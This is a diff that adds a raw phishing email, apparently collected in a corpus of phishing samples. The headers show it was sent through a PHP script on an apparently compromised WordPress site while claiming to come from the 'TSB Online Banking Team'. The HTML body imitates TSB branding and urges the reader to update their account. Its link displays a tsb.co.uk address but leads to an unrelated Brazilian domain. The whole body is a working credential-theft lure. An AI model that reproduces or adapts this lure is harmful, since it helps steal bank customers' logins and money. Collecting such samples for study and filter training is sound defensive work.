@@ -1,0 +1,93 @@
+Return-Path: hemenkurulum@ns1.hemenkurulum.net
+Delivered-To: jose@monkey.org
+X-FDA: 77518617246.37.F7BBB53
+Received: from server-185.25.101.216.as42926.net (unknown [185.25.101.216])
+	by imf15.b.hostedemail.com (Postfix) with ESMTP id 8613F1003494D
+	for <jose@monkey.org>; Tue, 24 Nov 2020 08:17:23 +0000 (UTC)
+Received: from hemenkurulum by ns1.hemenkurulum.net with local (Exim 4.93)
+	(envelope-from <hemenkurulum@ns1.hemenkurulum.net>)
+	id 1khTVo-000B6q-EF
+	for jose@monkey.org; Tue, 24 Nov 2020 11:17:20 +0300
+To: jose@monkey.org
+Subject: Dear Customer
+X-PHP-Script: theme-00011.hemenkurulum.net/wp-includes/js/jcrop/oG.php for 129.205.113.250
+X-PHP-Originating-Script: 1001:oG.php
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: TSB Online Banking Team <customercare@tsb.co.uk>
+Reply-To: customercare@tsb.co.uk
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: theme-00011.hemenkurulum.net
+Message-Id: <E1khTVo-000B6q-EF@ns1.hemenkurulum.net>
+Date: Tue, 24 Nov 2020 11:17:20 +0300
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - ns1.hemenkurulum.net
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [1001 993] / [47 12]
+X-AntiAbuse: Sender Address Domain - ns1.hemenkurulum.net
+X-Get-Message-Sender-Via: ns1.hemenkurulum.net: authenticated_id: hemenkurulum/only user confirmed/virtual account not confirmed
+X-Authenticated-Sender: ns1.hemenkurulum.net: hemenkurulum
+X-Source: 
+X-Source-Args: php-fpm: pool theme-00011_hemenkurulum_net               
+X-Source-Dir: hemenkurulum.net:/public_html/theme-00011/wp-includes/js/jcrop
+X-Spam-Status: No, score=21.74
+X-Stat-Signature: yhgqww7i64am9b3wztdrc7e3bot1zmwp
+X-Rspamd-Queue-Id: 8613F1003494D
+X-Rspamd-Server: rspam03
+Received-SPF: none (ns1.hemenkurulum.net>: No applicable sender policy available) receiver=imf15.b.tucows.com; identity=mailfrom; envelope-from="<hemenkurulum@ns1.hemenkurulum.net>"; helo=server-185.25.101.216.as42926.net; client-ip=185.25.101.216
+X-Spam-Summary: 50,0,0,75b4a7dff298da08,d41d8cd98f00b204,hemenkurulum@ns1.hemenkurulum.net,jose@monkey.org,RULES_HIT:41:72:355:375:379:455:540:541:543:560:960:962:967:969:970:973:983:988:989:1147:1189:1208:1224:1313:1314:1345:1381:1431:1432:1433:1434:1436:1437:1516:1517:1534:1542:1545:1560:1565:1571:1588:1589:1593:1594:1686:1711:1712:1714:1730:1747:1777:1792:2194:2198:2199:2200:2393:2525:2527:2549:2560:2565:2610:2682:2685:2741:2828:2859:2890:2894:2895:2902:2924:2926:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3138:3139:3140:3141:3142:3585:3876:3877:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:5007:6114:6119:6261:6642:8513:8518:8583:8603:8784:8957:9025:9416:9908:10004:10346:10971:11026:11473:11657:11658:12043:12295:12438:12477:12555:12679:12740:12891:12895:12903:12956:12958:12959:12967:12968:12986:13046:13374:13439:13546:13551:14037:14093:14181:14196:14571:14721:14828:14985:18000:21080:21325:21433:21450:21451:21524:21627:21795:21881:21939:30001:30051:30054:30055:30069:
+ 30070,0,RBL:04yfs8wwiqf79jxrare9iwuuptx5zor314rmj4qxhrt5qerrzxxw8z59afqat7s.pqub4z7uppujwykpeapardj3nyqbyuwphk1omt3pefkq8eskqnrn3z4j46997wt.qqa4twn3kbohi6fqc6xprcqt6kcorhgebc5wskz8ozdu1k4o1dazmpwo-lbl8.mailshell.net-223.238.255.100,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:26,LUA_SUMMARY:none
+X-HE-Tag: 1606205843-344585
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 145
+
+<HTML><HEAD>
+<META name=GENERATOR content="MSHTML 8.00.7601.17514"></HEAD>
+<BODY><SPAN style="FONT-SIZE: 12pt" id=x_divtagdefaultwrapper><FONT face=arial,sans-serif>
+<TABLE style="BORDER-COLLAPSE: collapse; MAX-WIDTH: 640px">
+<TBODY>
+<TR>
+<TD style="PADDING-BOTTOM: 10px; MARGIN: 0px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; PADDING-TOP: 10px"><IMG alt=DocuSign 
+
+src="https://upload.wikimedia.org/wikipedia/en/d/d9/TSB_Bank_logo.png" width=150 data-imagetype="External"></TD></TR>
+<TR>
+<TD style="PADDING-BOTTOM: 30px; MARGIN: 0px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; PADDING-TOP: 0px">
+<TABLE style="BACKGROUND-COLOR: rgb(30,76,161); WIDTH: 422px" border=0 cellSpacing=0 cellPadding=0 width=422 align=center>
+<TBODY>
+<TR>
+<TD style="TEXT-ALIGN: center; PADDING-BOTTOM: 36px; MARGIN: 0px; PADDING-LEFT: 36px; WIDTH: 520px; PADDING-RIGHT: 36px; 
+
+PADDING-TOP: 28px; border-radius: 2px" width=520 align=middle><FONT face="Helvetica,arial,sans serif">
+<IMG src="https://upload.wikimedia.org/wikipedia/en/d/d9/TSB_Bank_logo.png" 
+width=75 height=75 data-imagetype="External"> 
+<TABLE style="WIDTH: 350px" border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="BORDER-BOTTOM: 4px; TEXT-ALIGN: center; BORDER-LEFT: 4px; MARGIN: 0px; BORDER-TOP: 4px; BORDER-RIGHT: 4px; PADDING-
+
+TOP: 24px" align=middle><FONT color=white face=arial,sans-serif>Dear User,<BR>We recently updated our online banking security for 
+
+our customers safety as always. <BR></A>Kindly complete your account update process on our webpage link below<BR><FONT 
+
+size=4><FONT color=#fa1705><SPAN style="FONT-SIZE: 15px; BACKGROUND-COLOR: rgb(255,196,35)"><B><A id=LPlnk181600 style="TEXT-
+
+DECORATION: none" href="https://blog.premiershop.com.br/web/m.php" rel="noopener noreferrer" target=_blank><FONT 
+
+color=#333333><SPAN id=LPlnk181600 style="DISPLAY: inline-block">www.tsb.co.uk/accupdateprocess</FONT> 
+
+</FONT></FONT></TD></TR></TBODY></TABLE>
+<TABLE style="WIDTH: 350px" border=0 cellSpacing=0 cellPadding=0 width="100%">
+<TBODY>
+<TR>
+<TD style="TEXT-ALIGN: center; MARGIN: 0px; PADDING-TOP: 30px" align=middle><FONT face=arial,sans-serif>
+<TABLE cellSpacing=0 cellPadding=0>
+<TBODY>
+<TR><FONT color=white face=arial,sans-serif><FONT size=2>©TSB Online Banking Team</FONT></SPAN> 
+
+</FONT></A></TR></TBODY></TABLE></FONT></TD></TR></TBODY></TABLE></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></FON
+
+T></SPAN></BODY></HTML>
+
